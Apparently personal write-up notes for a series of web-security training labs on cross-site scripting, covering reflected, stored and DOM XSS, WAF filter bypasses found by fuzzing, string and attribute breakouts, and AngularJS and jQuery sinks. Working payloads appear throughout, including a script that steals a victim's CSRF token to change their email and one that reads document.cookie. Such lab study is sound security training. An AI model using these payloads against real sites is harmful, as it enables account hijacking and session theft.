
# Lab: Reflected XSS into HTML context with nothing encoded
- This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
- This was a case of reflected XSS where the vulnerability is injected into the HTTP request 
- So after clicking on the search bar , i edited the url request and added <script>alert(1)</script> 
- And cross site scripting attack called the alert function

# Lab: Exploiting XSS to bypass CSRF defenses
- This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.
- After navigating to change email section , i found out that there is an anti-csrf token 
- So the website has XSS vulnerability in the comments section of the blogpost , so i need to submit an javascript where the victim after clicking on the link , get his email changed to test@test.com and the victim's csrf token will be stolen and i can use it to impersonify as the victim 
- <script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>


# Lab: Stored XSS into HTML context with nothing encoded
- This lab contains a stored cross-site scripting vulnerability in the comment functionality.
- Same as the the first one , except this was stored XXS vulnerability meaning i had to post a comment since stored XSS in stored in the database and is open to other users
- <script>alert(1)</script> 


# Lab: Reflected XSS into HTML context with most tags and attributes blocked
- This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
-  Inject a standard XSS vector, such as:
    <img src=1 onerror=print()>`
-   This gets blocked. In the next few steps, use Burp Intruder to test which tags and attributes are being blocked.
-  Send the search function request to burp INTRUDER
-  In Burp Intruder, replace the value of the search  `<>`
-  Placed the cursor between the angle brackets and added  payload position. The value of the search term `<§§>`
-  Pasted the list of tags into the payloads list and started the attack 
-  When the attack is completed , all payloads have 400 status code except 'body' which has 200 status code\
- Replaced search term with:`<body%20=1>` in INTRUDER
-  Placed the cursor before the `=` character and  added payload `<body%20§§=1>`
-  Again , under payload config pasted the list of attributes after clearing the previous ones
-  When the attack is finished, review the results. Most payloads caused a `400` response, but the `onresize` payload caused a `200` response.
-  NAvigated to the exploit server and pasted replacing `YOUR-LAB-ID` with my lab ID:`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
- Just had to store the payload and deliver it to the victim 


# Lab: Reflected XSS into HTML context with all tags blocked except custom ones
- <script> 
    location = 'https://YOUR-LAB-ID.web-security-academy.net/?   search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
- Then stored and delivered the exploit 

# Lab: Reflected XSS with event handlers and `href` attributes blocked
- This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked
- Since some tags were whitelisted , i brute forced  all the custom tags frrom XSS cheat sheet and found couple tags which returned status code 200 upon proccesing the request 
- Repeated the process for < a SS=X> and got nothing , all events arre blocked 
- Instead of using the href= ,  figured out a way that the browser itself changes the hyperttext reference since the lab was blocking everything that had href= , but your payload can contain href in it just not the href= 
- Used the svg animate atttribute which was specific to chrome and then created a payload , https://0a9e00e003c985568043309a00060091.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E and the lab was solved

# Lab: Reflected XSS with some SVG markup allowed
- This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
- Since its reflected XSS , searched random thing and forwarded then req to intruder and repeater 
- Brute forced all the custom tags from XSS cheat sheet and then svg , animatetransform , title , set returned status code 200 each 
- Then used < svg > < animatetranform%20SS=1 >( %20 - space hex value and SS being payloads) and then onbegin returned 200 status code and rest all were 400 
   - Used this payload and https://0a77000204b8a175801f44d500ba00c0.h1-web-security-academy.net/ search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E solved the lab 


# # Lab: Reflected XSS into attribute with angle brackets HTML-encoded
- This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.
- "onmouseover="alert(1) broke he html encoding and solved the lab

# Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded
- This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.
- Since its a stored XSS , the injection point is thee comment section , after insepcting all the comments from the blog , href is used and its used in the website field 
- So posted a random comment , name , mail , as for the website field since they recognize http , https and ftp and javascript , jus injected javascript:alert(1) and it executed 

# Lab: Reflected XSS in canonical link tag
 - This lab reflects user input in a canonical link tag and escapes angle brackets.
   To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the `alert` function.
 - USed the access key conceps in this lab , did not have to break the attribute , instead was already in it 
 - USed cTRL U to get html source code and got the pattern and used single quotes instead of double quotes and then was able to modify the url in a way i wanted - https://0a0b00ed0404b7e5803903e400c20059.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
-  This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
- The lab contained javascript string , so just had to figure out the tags used and see the pattern of those , the lab contained                    
- <script>
    var searchTerms = 'sid123';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>
 - Broke out of the script with -
-  </script> <img src=1 onerror=alert(document.domain)>
 the second part is the payload , since there's no image source 1 , this fires / activates the oneerror and this event fires when there's an error of any sort and executes the alert lab


# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
- Same reflected XSS vulnerability , just need to inspect the webpage and figure out patterns 
- The lab contains js strings , so used '-alert(1)-' to break out of it and execute the alert function


# Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
-  The random string has been reflected inside a JavaScript string.
-  Tried sending the payload `test'payload` and observed that single quote gets backslash-escaped, preventing from breaking out of the string.
-  Tried sending the payload `test\payload` and observed that  backslash doesn't get escaped.
- Replaced input with the following payload to break out of the JavaScript string and inject an alert:
    \\'-alert(1)//`



# Lab: Reflected XSS in a JavaScript URL with some characters blocked
- This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.
- The exploit uses exception handling to call the `alert` function with arguments. The `throw` statement is used, separated with a blank comment in order to get round the no spaces restriction. The `alert` function is assigned to the `onerror` exception handler.
- As `throw` is a statement, it cannot be used as an expression. Therefore need to use arrow functions to create a block so that the `throw` statement can be used.Then need to call this function,  assign it to the `toString` property of `window` and trigger this by forcing a string conversion on `window`.

# Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
- This lab contains a stored cross-site scripting vulnerability in the comment functionality.To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.
- The lab is vulnerable to stored XSS , hence the payload is injectable in the comments section of the blogpost 
- Inspecting the page aftermath of submitting random comment , found that i am directly inside of the onclick event , so i dont need onclick in my payload , also the event had the website in it making it the injectable field in the comments section
- http://foo?&apos;-alert(1)-&apos; (&apos; is html encoding for ' ) and it was solved 


# Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
- This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.
- The lab has reflected XSS so injectable point is the search bar , aftermath of inspecting requests and source code when the search is used the following code is seen in the response : 
  var message = `0 search results for 'sid123'`;
  document.getElementById('searchMessage').innerText = message;
- So had to inject my payload : ${alert(document.domain)} 


# Lab: DOM XSS in `document.write` sink using source `location.search`
-  This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.
- After inpecting the element , my search string is being put inside img src , so just had to close the tags and inject my payload -"> < svg onload=alert(1) > 


# Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element 
- This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.
- This lab has unique StoreID functionality where you can check the stock of the product , the url is injectable and i just need to add the storeId into the url 
- Added the storeId and the browser accepted it , then closed the html tag and injected the payload - https://0a85009e032b4a73806a035e00950067.web-security-academy.net/product?productId=2&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E and the lab is solved



# Lab: DOM XSS in `innerHTML` sink using source `location.search`
- This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.
- Same as the previous lab except this uses innerhtml as its sink , had to close the tag and inject my payload - "> < img src=1 onerror=alert(1)> and the lab's solved


# Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
- This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.
- Whenever the website's url is changed to alphanumeric strings , it is been put into the href attribute , so just had to change the returnpath=javascript:alert(document.domain) and it's done


# Lab: DOM XSS in jQuery selector sink using a hashchange event
- This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.
- DOM XSS vulnerability where the payload comes from `location.hash` (everything after `#` in the URL) and is passed into jQuery's `$()` selector. 
- Normally `$()` is used to find elements (e.g. `$("#login")`), but older versions of jQuery also interpreted HTML passed into it and created new DOM elements, leading to XSS. 
- The `hashchange` event is used to trigger the vulnerable code whenever the URL hash changes. The iframe payload simply changes the hash automatically, causing the event to fire and execute the payload.
- <iframe src="0add00e904929b6f834c5047007d0027.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>


# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
- This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality. AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
- AngularJS was enabled (`ng-app`), so expressions inside `{{ }}` were evaluated instead of treated as plain text. 
- Verified the injection point by using `{{7*7}}`, which evaluated to `49`, confirming AngularJS expression injection. Since normal JavaScript (`{{alert(1)}}`) is not valid in AngularJS expressions, an AngularJS-specific payload from the XSS Cheat Sheet was required to execute JavaScript.
- Used payload from the "AngularJS sandbox escapes reflected" and was able to get through 


# Lab: Reflected DOM XSS
- This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.To solve this lab, create an injection that calls the `alert()` function.
 - Reflected DOM XSS is a combination of reflected XSS and DOM XSS. The server first reflects the user input into a JSON response, which is then processed by client-side JavaScript.
- The Source was `window.location.search`, the reflected input was returned in `this.responseText`, and the Sink was `eval()`, which executed the JSON response as JavaScript.
- By testing special characters, it was observed that double quotes (`"`) were escaped but backslashes (`\`) were not. This allowed bypassing the escaping, breaking out of the JSON string, executing `alert(1)`, and commenting out the remaining code.
- \"-alert(1)}// 


# Lab: Stored DOM XSS
- This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.
-  Stored DOM XSS where user comments are stored by the server, returned as JSON, and inserted into the page using `innerHTML`.
- The custom `escapeHTML()` function only escaped the first `<` and first `>` using `.replace()`, making the sanitization incomplete.
- By abusing the weak sanitization, an HTML element with an automatically triggered event (`autofocus` + `onfocus`) survived and executed JavaScript.<xss onfocus="alert(1)" autofocus="" tabindex="1&gt;"></xss> 



